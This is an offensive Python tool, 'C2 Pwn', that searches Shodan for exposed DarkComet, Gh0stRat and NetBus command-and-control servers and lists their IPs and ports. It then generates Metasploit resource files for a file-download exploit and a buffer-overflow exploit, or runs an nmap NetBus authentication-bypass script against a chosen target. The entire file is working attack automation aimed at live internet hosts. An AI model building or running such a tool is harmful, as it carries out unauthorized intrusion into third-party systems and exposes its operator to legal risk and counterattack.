## Author: LukeBob
## Automate Pwning C2 "Command and Controll" Servers Using Vulnerable Versions
## Carefull As You Could Possibly Attack An Expeirenced OP And Get Attacked Back
## C2 pwn

import os
import shodan
from time import sleep
import argparse


Nmap_path = ''  ## <--- Only Needed For Windows

## Writes RC File
class rc:
    def __init__(self,payload,rport,lport,lhost,rhost):
        self.payload = payload
        self.rport   = rport
        self.lport   = lport
        self.lhost   = lhost
        self.rhost   = rhost

    def build(self):
        rc_data = (
        """
use %s
set RPORT %s
set LPORT %s
set LHOST %s
set RHOST %s
exploit
        """%(self.payload,self.rport,self.lport,self.lhost,self.rhost))

        if self.payload == 'auxiliary/gather/darkcomet_filedownloader':
            with open("DarkComet_Metasploit.rc", "w+") as file:
                file.write(rc_data)

        elif self.payload == 'exploit/windows/misc/gh0st':
            with open("GhostRat_Metasploit.rc", "w+") as file:
                file.write(rc_data)


banner =("""
     ___ ____      ___
    / __\___ \    / _ \_      ___ __
   / /    __) |  / /_)| \ /\ / / '_ '
  / /___ / __/  / ___/ \ V  V /| | | |
  \____/|_____| \/      \_/\_/ |_| |_|
    (V-1.0) Author: LukeBob
""")

## Terms you can use on shodan "free version" to pickup C2 Servers
## On paid version you could go much deeper
malware_terms = {
    "DarkComet"   : "BF7CAB464EFB",
    "Gh0stRat"    : "gh0st",
    "NetBus"      : "NetBus 1.60"
}

## Creates New Shodan Api Object
def get_api(api_key):
    try:
        print('\n\t------------------------------\n\t Connecting To Shodan API...\n\t------------------------------')
        api = shodan.Shodan(api_key)
        sleep(1)
        api.info()
        print('\t Created New Api Instance!\n\t------------------------------\n\n\n')
        return(api)
    except shodan.exception.APIError as e:
        print('\t[#] Error: %s' % e)
        exit(0)

## Gets Back Results in Dictionary Format
def search(api, term, name):
    try:
        results = api.search(term)
        return results
    except shodan.APIError as e:
        print('Error: %s' % e)
        exit(0)

## Parses Choices From User And Sends Them To Rc Class.
def pwn_one(results, name):
    print("""
        ---------------------------------
        ~           Options            ~
        ---------------------------------
         (1) List Available %s Targets
         (2) Quit
        ---------------------------------
    """%(name))
    sing_choice = input('[*] Option (1,2): ')
    if sing_choice == '1':
        print('\n\n\t\t----------------------------\n\t\t %s C2 Server List\n\t\t----------------------------\n\n'%(name))
        for i in results['matches']:
            print("\t\t IP: {0} -- Port: {1}".format(i['ip_str'],i['port']))
        print("\n")

        ## user input for target ip and port.
        IP    = input("[*]Target Ip: ")
        print("===> %s\n"%(IP))
        PORT  = input("[*]Target Port: ")
        print("===> %s\n"%(PORT))
        LIP   = input("[*]Listner Ip: ")
        print("===> %s\n"%(LIP))
        LPORT = input("[*]Listner Port: ")
        print("===> %s\n"%(LPORT))

        ## DarkComet rc
        if name == "DarkComet":
            rc("auxiliary/gather/darkcomet_filedownloader",PORT,LPORT,LIP,IP).build()
            if os.name != 'nt':
                os.system("service postgresql restart")
            print(
                """

                    ----------------------------------------------------------------------------------
                    ~                                    RESULT                                     ~
                    ----------------------------------------------------------------------------------
                    ~  Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.rc   ~
                    _        Remember, if you are behind nat, port forward port (%s)                ~
                    ----------------------------------------------------------------------------------


                """
                %(LPORT))

            sleep(7)

        ## Gh0st rc
        if name == 'gh0st':
            rc("exploit/windows/misc/gh0st",PORT,LPORT,LIP,IP).build()
            if os.name != 'nt':
                os.system("service postgresql restart")
            print(
            """

                ----------------------------------------------------------------------------------
                ~                                    RESULT                                     ~
                ----------------------------------------------------------------------------------
                ~  Now You Can Launch The Exploit With, msfconsole -r GhostRat_Metasploit.rc    ~
                _        Remember, if you are behind nat, port forward port (%s)                ~
                ----------------------------------------------------------------------------------


            """
            %(LPORT))
            sleep(10)

        ## Only nmap module available atm :(
        if name == "NetBus":
            print("\n\t[#]Trying Auth Bypass ... ")

            if os.name != 'nt':
                NB_comm = "nmap -p %s --script netbus-auth-bypass %s"%(PORT,IP)
            elif os.name == 'nt':
                if Nmap_path != '':
                    try:
                        NB_comm = "%s -p %s --script netbus-auth-bypass %s"%(Nmap_path,PORT.IP)
                    except:
                        raise
                elif Nmap_path == '':
                    print("\n\n\t[#] Requires Path To Nmap Binary To Continue.")
                    sleep(2)
                    quit(0)

            os.system(NB_comm)

    ## Quit
    elif sing_choice == '2':
        print("\n\n\t[#] Shutting Down Program\n")
        quit(0)


def main(key):
    quit = False

    ## Creates API Instance
    api = get_api(key)
    
    ## Main Loop
    while not quit:
        print("""
          -----------------------------------------------------------------------------------------------------------------------------------------------------
          ~                                                               C2 ServerList                                                                       ~
          -----------------------------------------------------------------------------------------------------------------------------------------------------
           (1) DarkComet   <-- DarkComet Server Remote File Download Exploit <---> https://www.rapid7.com/db/modules/auxiliary/gather/darkcomet_filedownloader
           (2) Gh0stRat    <-- Gh0st Client buffer Overflow                  <---> https://www.rapid7.com/db/modules/exploit/windows/misc/gh0st
           (3) NetBus      <-- Netbus Auth Bypass                            <---> https://nmap.org/nsedoc/scripts/netbus-auth-bypass.html
           (4) Quit
          -----------------------------------------------------------------------------------------------------------------------------------------------------
        """)
        number = input("\n\t  [*] C2 Server Kind To Exploit (1,2,3,4): ")
        print("\n\n")

        ## Search Shodan For DarkComet C2 Servers
        if number == '1':
            name="DarkComet"
            new_dict = search(api, term=malware_terms["DarkComet"], name=name)

        ## Search Shodan For GhostRat C2 Servers
        if number == '2':
            name="gh0st"
            new_dict = search(api, term=malware_terms["Gh0stRat"], name=name)

        ## Search Shodan For NetBus Trojan C2 Servers
        if number == '3':
            name="NetBus"
            new_dict = search(api, term=malware_terms["NetBus"], name=name)

        ## Quit
        if number == '4':
            print("\n\t Shutting Down Program")
            quit = True
        if not quit:
            pwn_one(new_dict, name)

if __name__ == '__main__':
        print(banner)
        sleep(1)
        ## ArgParse Stuff
        parser = argparse.ArgumentParser(description='C2 Pwn')
        parser.add_argument('--key', help='Shodan Api Key')
        args = parser.parse_args()
        if args.key:
            key = args.key
            main(key)
        else:
            parser.print_help()
            quit(0)

